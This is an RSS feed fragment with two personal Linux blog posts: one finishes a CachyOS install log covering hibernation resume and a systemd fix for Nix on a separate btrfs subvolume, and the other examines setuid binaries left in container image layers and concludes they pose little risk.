<p><img src="./playground/cachyos-install/images/noswap.jpg" class="img-fluid"></p>
<p>Except… that UUID doesn’t exist. There is no mention of it in /etc/fstab. Then I remembered, according to the arch wiki article for hibernation, systemd stores the location where to resume from a hibernation in <code>/sys/firmware/vars/efivars/HibernateLocation</code>.</p>
<div class="sourceCode" id="cb3" data-file="/sys/firmware/vars/efivars/HibernateLocation" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb3-1">{"uuid":"74fd980d-396b-46be-8123-ed41bcaa2713","offset":2269039,"kernelVersion":"6.9.3-4-cachyos","osReleaseId":"cachyos"}</span></code></pre></div>
<p>Now this looks good… except whatever hibernate resume was trying to happen, failed. This is probably because I reinstalled linux, after I had just hibernated it, leaving that efivar in place.</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb4-1">[root@cachyos-x8664 efivars]# btrfs inspect-internal map-swapfile -r /swap/swapfile</span>
<span id="cb4-2">2168766</span></code></pre></div>
<p>The offset was wrong. To fix it? I just had to hibernate the system normally. Then this issue went away.</p>
<p>With this, my setup is complete. But I still don’t understand the benefits of non-nested subvolumes. I ended up making a <a href="https://programming.dev/post/15458752">lemmy post</a> about it, but I haven’t gotten any conclusive answers yet.</p>
</section>
<section id="user-data" class="level1">
<h1>User data</h1>
<p>I backed up my entire home directory to a tar archive using ark, the archiver tool on KDE. However, since I was backing it up to a usb thumb drive, I used <a href="https://wiki.archlinux.org/title/Gocryptfs">gocryptfs</a> to encrypt the folder where the archive was stored. I encrypt sensitive data I put on my usb drives, that way, even if I lose the drive, nothing gets compromised.</p>
</section>
<section id="misc-config-changes" class="level1">
<h1>Misc config changes</h1>
<p>I also enabled the <a href="https://wiki.archlinux.org/title/Keyboard_shortcuts#Kernel_(SysRq)">Magic sysrq key</a> via a kernel parameter in my grub config file.</p>
</section>
<section id="nix-not-starting-on-boot." class="level1">
<h1>Nix not starting on boot.</h1>
<p>I encountered another issue where nix does not start on boot. The problem is probably that, because /nix is a seperate btrfs subvolume, and the systemd service is a symlink to the nix service on /nix, systemd cannot locate the proper service. I need to either move the nix service so it is located on the root subvolume, or adjust the nix daemon service so it requires /nix to be mounted.</p>
<p>Thankfully, systemd unit files have an option for this: <a href="https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html#RequiresMountsFor=">RequiresMountsFor=</a>.</p>
<p>And to adjust the nix daemon service, I can use override, as <a href="https://askubuntu.com/questions/659267/how-do-i-override-or-configure-systemd-services">mentioned on stackoverflow</a>. Although, I don’t like this solution. Since the original service is still a symlink, would systemd really be able to find it?</p>
<p>I found a <a href="https://github.com/DeterminateSystems/nix-installer/issues/416">relevant GitHub issue</a> on the on the page for the Determinate Systems Nix installer, which is what I use. Just like me, another user wants to have /nix on a seperate btrfs subvolume. Although they first did a workaround of removing the symlink, and copying the service files to /etc instead. However, one of the developers chimed in, mentioning the solution for the Steam Deck (a Linux handheld which uses btrfs), which was a systemd oneshot service that runs after nix is mounted, and then reloads all systemd services, and then restarts the nix socket. This was a lot easier to implement on my system.</p>
<p>The systemd service was stored in the source code of the installer.</p>
<p>https://github.com/DeterminateSystems/nix-installer/blob/main/src/planner/steam_deck.rs#L270</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>/etc/systemd/system/ensure-symlinked-units-resolve.service</strong></pre>
</div>
<div class="sourceCode" id="cb5" data-filename="/etc/systemd/system/ensure-symlinked-units-resolve.service" style="background: #f1f3f5;"><pre class="sourceCode ini code-with-copy"><code class="sourceCode ini"><span id="cb5-1"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">[Unit]</span></span>
<span id="cb5-2"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">Description</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">Ensure Nix related units which are symlinked resolve</span></span>
<span id="cb5-3"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">After</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">nix.mount</span></span>
<span id="cb5-4"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">Requires</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">nix.mount</span></span>
<span id="cb5-5"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">DefaultDependencies</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">=</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">no</span></span>
<span id="cb5-6"></span>
<span id="cb5-7"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">[Service]</span></span>
<span id="cb5-8"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">Type</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">oneshot</span></span>
<span id="cb5-9"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">RemainAfterExit</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">=</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">yes</span></span>
<span id="cb5-10"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">ExecStart</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">/usr/bin/systemctl daemon-reload</span></span>
<span id="cb5-11"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">ExecStart</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">/usr/bin/systemctl restart --no-block nix-daemon.socket</span></span>
<span id="cb5-12"></span>
<span id="cb5-13"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">[Install]</span></span>
<span id="cb5-14"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">WantedBy</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">sysinit.target</span></span></code></pre></div>
</div>
<p>And with this, the nix socket starts properly on boot.</p>


</section>

 ]]></description>
  <category>playground</category>
  <guid>./playground/cachyos-install/</guid>
  <pubDate>Tue, 04 Jun 2024 07:00:00 GMT</pubDate>
</item>
<item>
  <title>Container images and setuid binaries</title>
  <link>./playground/setuid-containers/</link>
  <description><![CDATA[ 




<p>A friend sends me a message in Discord:</p>
<p><code>$ find / -perm /4000</code></p>
<blockquote class="blockquote">
<p>That will show all suid executables on your system</p>
</blockquote>
<p>They then post the output of this command on openbsd:</p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb1-1">/usr/bin/chfn</span>
<span id="cb1-2">/usr/bin/chpass</span>
<span id="cb1-3">/usr/bin/chsh</span>
<span id="cb1-4">/usr/bin/doas</span>
<span id="cb1-5">/usr/bin/lpr</span>
<span id="cb1-6">/usr/bin/lprm</span>
<span id="cb1-7">/usr/bin/passwd</span>
<span id="cb1-8">/usr/bin/su</span>
<span id="cb1-9">/usr/libexec/lockspool</span>
<span id="cb1-10">/usr/libexec/ssh-keysign</span>
<span id="cb1-11">/usr/sbin/authpf</span>
<span id="cb1-12">/usr/sbin/authpf-noip</span>
<span id="cb1-13">/usr/sbin/pppd</span>
<span id="cb1-14">/usr/sbin/traceroute</span>
<span id="cb1-15">/usr/sbin/traceroute6</span>
<span id="cb1-16">/sbin/ping</span>
<span id="cb1-17">/sbin/ping6</span>
<span id="cb1-18">/sbin/shutdown</span></code></pre></div>
<p>Another friend tries it out on Gentoo Linux</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb2-1">/usr/bin/chfn</span>
<span id="cb2-2">/usr/bin/chpass</span>
<span id="cb2-3">/usr/bin/chsh</span>
<span id="cb2-4">/usr/bin/doas</span>
<span id="cb2-5">/usr/bin/lpr</span>
<span id="cb2-6">/usr/bin/lprm</span>
<span id="cb2-7">/usr/bin/passwd</span>
<span id="cb2-8">/usr/bin/su</span>
<span id="cb2-9">/usr/libexec/lockspool</span>
<span id="cb2-10">/usr/libexec/ssh-keysign</span>
<span id="cb2-11">/usr/sbin/authpf</span>
<span id="cb2-12">/usr/sbin/authpf-noip</span>
<span id="cb2-13">/usr/sbin/pppd</span>
<span id="cb2-14">/usr/sbin/traceroute</span>
<span id="cb2-15">/usr/sbin/traceroute6</span>
<span id="cb2-16">/sbin/ping</span>
<span id="cb2-17">/sbin/ping6</span>
<span id="cb2-18">/sbin/shutdown</span></code></pre></div>
<p>I suppose I should explain what setuid binaries are. Setuid binaries run with the permissions of the user who owns the binary. Usually, it’s used for things like <code>sudo</code>, which use setuid to elevate the binary to root first, and then the rootful binary then does the things, like grant permissions.</p>
<p>Setuid binaries are typically considered a security risk, because an exploit like a buffer overflow or some other exploit can be disasterous in a process running as root. In fact, that’s how many privilege escalation vulnerabilities on Linux have happened — exploiting a setuid binary owned by root.</p>
<p>I then run the command on my own system (Arch Linux)</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb3-1">[moonpie@lizard ~]$ find / -perm /4000 2&gt;/dev/null</span>
<span id="cb3-2">/home/moonpie/.local/share/containers/storage/overlay/2fa37f2ee66efbd308b9b91bce81c262f5e6ab6c3bf8056632afc60cc602785c/diff/usr/bin/chfn</span>
<span id="cb3-3">/home/moonpie/.local/share/containers/storage/overlay/2fa37f2ee66efbd308b9b91bce81c262f5e6ab6c3bf8056632afc60cc602785c/diff/usr/bin/chsh</span>
<span id="cb3-4">/home/moonpie/.local/share/containers/storage/overlay/2fa37f2ee66efbd308b9b91bce81c262f5e6ab6c3bf8056632afc60cc602785c/diff/usr/bin/gpasswd</span>
<span id="cb3-5">/home/moonpie/.local/share/containers/storage/overlay/2fa37f2ee66efbd308b9b91bce81c262f5e6ab6c3bf8056632afc60cc602785c/diff/usr/bin/mount</span>
<span id="cb3-6">/home/moonpie/.local/share/containers/storage/overlay/2fa37f2ee66efbd308b9b91bce81c262f5e6ab6c3bf8056632afc60cc602785c/diff/usr/bin/newgrp</span>
<span id="cb3-7">/home/moonpie/.local/share/containers/storage/overlay/2fa37f2ee66efbd308b9b91bce81c262f5e6ab6c3bf8056632afc60cc602785c/diff/usr/bin/passwd</span>
<span id="cb3-8">/home/moonpie/.local/share/containers/storage/overlay/2fa37f2ee66efbd308b9b91bce81c262f5e6ab6c3bf8056632afc60cc602785c/diff/usr/bin/su</span>
<span id="cb3-9">/home/moonpie/.local/share/containers/storage/overlay/2fa37f2ee66efbd308b9b91bce81c262f5e6ab6c3bf8056632afc60cc602785c/diff/usr/bin/umount</span>
<span id="cb3-10">/home/moonpie/.local/share/containers/storage/overlay/b2a22dd93936f487715bbc38b3a93f3f8e7d927fbf473871581c0a333f94d23a/diff/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
<span id="cb3-11">/home/moonpie/.local/share/containers/storage/overlay/af21757bc7d5f497f4ce0552dbad07cf0725413c3a305e1ff2c8a7b5097eeb49/diff/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
<span id="cb3-12">/home/moonpie/.local/share/containers/storage/overlay/ae134c61b154341a1dd932bd88cb44e805837508284e5d60ead8e94519eb339f/diff/usr/bin/chfn</span>
<span id="cb3-13">/home/moonpie/.local/share/containers/storage/overlay/ae134c61b154341a1dd932bd88cb44e805837508284e5d60ead8e94519eb339f/diff/usr/bin/chsh</span>
<span id="cb3-14">/home/moonpie/.local/share/containers/storage/overlay/ae134c61b154341a1dd932bd88cb44e805837508284e5d60ead8e94519eb339f/diff/usr/bin/gpasswd</span>
<span id="cb3-15">/home/moonpie/.local/share/containers/storage/overlay/ae134c61b154341a1dd932bd88cb44e805837508284e5d60ead8e94519eb339f/diff/usr/bin/mount</span>
<span id="cb3-16">/home/moonpie/.local/share/containers/storage/overlay/ae134c61b154341a1dd932bd88cb44e805837508284e5d60ead8e94519eb339f/diff/usr/bin/newgrp</span>
<span id="cb3-17">/home/moonpie/.local/share/containers/storage/overlay/ae134c61b154341a1dd932bd88cb44e805837508284e5d60ead8e94519eb339f/diff/usr/bin/passwd</span>
<span id="cb3-18">/home/moonpie/.local/share/containers/storage/overlay/ae134c61b154341a1dd932bd88cb44e805837508284e5d60ead8e94519eb339f/diff/usr/bin/su</span>
<span id="cb3-19">/home/moonpie/.local/share/containers/storage/overlay/ae134c61b154341a1dd932bd88cb44e805837508284e5d60ead8e94519eb339f/diff/usr/bin/umount</span>
<span id="cb3-20">/home/moonpie/.local/share/containers/storage/overlay/fd77695eba64b4eb5db10dd9ef0181d0053dbc23e6c465f3001d664f19e621d7/diff/usr/lib/openssh/ssh-keysign</span>
<span id="cb3-21">/home/moonpie/.local/share/containers/storage/overlay/ede391454aeab91f6777dd38e55e085975ffcfd298987b8ec685196f2a6c811a/diff/usr/bin/chfn</span>
<span id="cb3-22">/home/moonpie/.local/share/containers/storage/overlay/ede391454aeab91f6777dd38e55e085975ffcfd298987b8ec685196f2a6c811a/diff/usr/bin/chsh</span>
<span id="cb3-23">/home/moonpie/.local/share/containers/storage/overlay/ede391454aeab91f6777dd38e55e085975ffcfd298987b8ec685196f2a6c811a/diff/usr/bin/gpasswd</span>
<span id="cb3-24">/home/moonpie/.local/share/containers/storage/overlay/ede391454aeab91f6777dd38e55e085975ffcfd298987b8ec685196f2a6c811a/diff/usr/bin/mount</span>
<span id="cb3-25">/home/moonpie/.local/share/containers/storage/overlay/ede391454aeab91f6777dd38e55e085975ffcfd298987b8ec685196f2a6c811a/diff/usr/bin/newgrp</span>
<span id="cb3-26">/home/moonpie/.local/share/containers/storage/overlay/ede391454aeab91f6777dd38e55e085975ffcfd298987b8ec685196f2a6c811a/diff/usr/bin/passwd</span>
<span id="cb3-27">/home/moonpie/.local/share/containers/storage/overlay/ede391454aeab91f6777dd38e55e085975ffcfd298987b8ec685196f2a6c811a/diff/usr/bin/su</span>
<span id="cb3-28">/home/moonpie/.local/share/containers/storage/overlay/ede391454aeab91f6777dd38e55e085975ffcfd298987b8ec685196f2a6c811a/diff/usr/bin/umount</span>
<span id="cb3-29">/home/moonpie/.local/share/containers/storage/overlay/c4bc4a1387e82c199a05c950a61d31aba8e1481a94c63196b82e25ac8367e5d1/diff/usr/bin/chage</span>
<span id="cb3-30">/home/moonpie/.local/share/containers/storage/overlay/c4bc4a1387e82c199a05c950a61d31aba8e1481a94c63196b82e25ac8367e5d1/diff/usr/bin/gpasswd</span>
<span id="cb3-31">/home/moonpie/.local/share/containers/storage/overlay/c4bc4a1387e82c199a05c950a61d31aba8e1481a94c63196b82e25ac8367e5d1/diff/usr/bin/mount</span>
<span id="cb3-32">/home/moonpie/.local/share/containers/storage/overlay/c4bc4a1387e82c199a05c950a61d31aba8e1481a94c63196b82e25ac8367e5d1/diff/usr/bin/newgrp</span>
<span id="cb3-33">/home/moonpie/.local/share/containers/storage/overlay/c4bc4a1387e82c199a05c950a61d31aba8e1481a94c63196b82e25ac8367e5d1/diff/usr/bin/passwd</span>
<span id="cb3-34">/home/moonpie/.local/share/containers/storage/overlay/c4bc4a1387e82c199a05c950a61d31aba8e1481a94c63196b82e25ac8367e5d1/diff/usr/bin/su</span>
<span id="cb3-35">/home/moonpie/.local/share/containers/storage/overlay/c4bc4a1387e82c199a05c950a61d31aba8e1481a94c63196b82e25ac8367e5d1/diff/usr/bin/umount</span>
<span id="cb3-36">/home/moonpie/.local/share/containers/storage/overlay/c4bc4a1387e82c199a05c950a61d31aba8e1481a94c63196b82e25ac8367e5d1/diff/usr/sbin/pam_timestamp_check</span>
<span id="cb3-37">/home/moonpie/.local/share/containers/storage/overlay/c4bc4a1387e82c199a05c950a61d31aba8e1481a94c63196b82e25ac8367e5d1/diff/usr/sbin/unix_chkpwd</span>
<span id="cb3-38">/home/moonpie/.local/share/containers/storage/overlay/c4bc4a1387e82c199a05c950a61d31aba8e1481a94c63196b82e25ac8367e5d1/diff/usr/sbin/userhelper</span>
<span id="cb3-39">/home/moonpie/.local/share/containers/storage/overlay/9b1016e74f7eb4282d4aa84ecefedda2bc0f6625203e5085e070bd649945a965/diff/usr/bin/fusermount3</span>
<span id="cb3-40">/usr/bin/fusermount</span>
<span id="cb3-41">/usr/bin/mount.cifs</span>
<span id="cb3-42">/usr/bin/fusermount3</span>
<span id="cb3-43">/usr/bin/mount.nfs</span>
<span id="cb3-44">/usr/bin/ksu</span>
<span id="cb3-45">/usr/bin/sudo</span>
<span id="cb3-46">/usr/bin/pkexec</span>
<span id="cb3-47">/usr/bin/chage</span>
<span id="cb3-48">/usr/bin/expiry</span>
<span id="cb3-49">/usr/bin/gpasswd</span>
<span id="cb3-50">/usr/bin/passwd</span>
<span id="cb3-51">/usr/bin/sg</span>
<span id="cb3-52">/usr/bin/unix_chkpwd</span>
<span id="cb3-53">/usr/bin/crontab</span>
<span id="cb3-54">/usr/bin/vmware-authd</span>
<span id="cb3-55">/usr/bin/chfn</span>
<span id="cb3-56">/usr/bin/chsh</span>
<span id="cb3-57">/usr/bin/mount</span>
<span id="cb3-58">/usr/bin/newgrp</span>
<span id="cb3-59">/usr/bin/su</span>
<span id="cb3-60">/usr/bin/umount</span>
<span id="cb3-61">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
<span id="cb3-62">/usr/lib/polkit-1/polkit-agent-helper-1</span>
<span id="cb3-63">/usr/lib/mail-dotlock</span>
<span id="cb3-64">/usr/lib/ssh/ssh-keysign</span>
<span id="cb3-65">/usr/lib/kf5/fileshareset</span>
<span id="cb3-66">/usr/lib/qemu/qemu-bridge-helper</span>
<span id="cb3-67">/usr/lib/cockpit/cockpit-session</span>
<span id="cb3-68">/usr/lib/vmware/bin/vmware-vmx</span>
<span id="cb3-69">/usr/lib/vmware/bin/vmware-vmx-debug</span>
<span id="cb3-70">/usr/lib/vmware/bin/vmware-vmx-stats</span>
<span id="cb3-71">/usr/lib/virtualbox/VBoxHeadless</span>
<span id="cb3-72">/usr/lib/virtualbox/VBoxNetAdpCtl</span>
<span id="cb3-73">/usr/lib/virtualbox/VBoxNetDHCP</span>
<span id="cb3-74">/usr/lib/virtualbox/VBoxNetNAT</span>
<span id="cb3-75">/usr/lib/virtualbox/VBoxSDL</span>
<span id="cb3-76">/usr/lib/virtualbox/VirtualBoxVM</span>
<span id="cb3-77">/usr/lib/electron27/chrome-sandbox</span>
<span id="cb3-78">/usr/lib/chromium/chrome-sandbox</span>
<span id="cb3-79">/usr/lib/electron28/chrome-sandbox</span>
<span id="cb3-80">/usr/lib/Xorg.wrap</span>
<span id="cb3-81">/opt/microsoft/msedge/msedge-sandbox</span></code></pre></div>
<p>But okay. This isn’t too bad. Maybe I can’t execute binaries from the contianer images, outside the container images.</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb4-1">[moonpie@lizard ~]$ cd /home/moonpie/.local/share/containers/storage/overlay/2fa37f2ee66efbd308b9b91bce81c262f5e6ab6c3bf8056632afc60cc602785c/diff/usr/bin/</span>
<span id="cb4-2">[moonpie@lizard bin]$ ./gpasswd</span>
<span id="cb4-3">configuration error - unknown item 'FAIL_DELAY' (notify administrator)</span>
<span id="cb4-4">Usage: gpasswd [option] GROUP</span>
<span id="cb4-5"></span>
<span id="cb4-6">Options:</span>
<span id="cb4-7">  -a, --add USER                add USER to GROUP</span>
<span id="cb4-8">  -d, --delete USER             remove USER from GROUP</span>
<span id="cb4-9">  -h, --help                    display this help message and exit</span>
<span id="cb4-10">  -Q, --root CHROOT_DIR         directory to chroot into</span>
<span id="cb4-11">  -r, --remove-password         remove the GROUP's password</span>
<span id="cb4-12">  -R, --restrict                restrict access to GROUP to its members</span>
<span id="cb4-13">  -M, --members USER,...        set the list of members of GROUP</span>
<span id="cb4-14">  -A, --administrators ADMIN,...</span>
<span id="cb4-15">                                set the list of administrators for GROUP</span>
<span id="cb4-16">Except for the -A and -M options, the options cannot be combined.</span></code></pre></div>
<p>That error is likely due to the fact that my Arch system has a newer version of the config file then whatever this <code>gpasswd</code> binary is expecting.</p>
<p>Theoretically, if there was a vulnerable setuid binary in one of these containers, then someone could execute it to become able to do things as my user.</p>
<p>However, this isn’t actually that big of an issue, because only I can access my home direcotry, where the container images are stored.</p>
<p>I also experimented with docker images, with the rootful docker daemon. The same thing happened, where only root has permission to read and execuite the directories those docker images are stored in.</p>
<p>I panicked at first, seeing all those setuid binaries, but it doesn’t seem to be that much of a deal, and doesn’t give people access to things they don’t already have access to.. by default at least.</p>



 ]]></description>
  <category>playground</category>
  <guid>./playground/setuid-containers/</guid>
  <pubDate>Thu, 02 May 2024 07:00:00 GMT</pubDate>
</item>
</channel>
</rss>
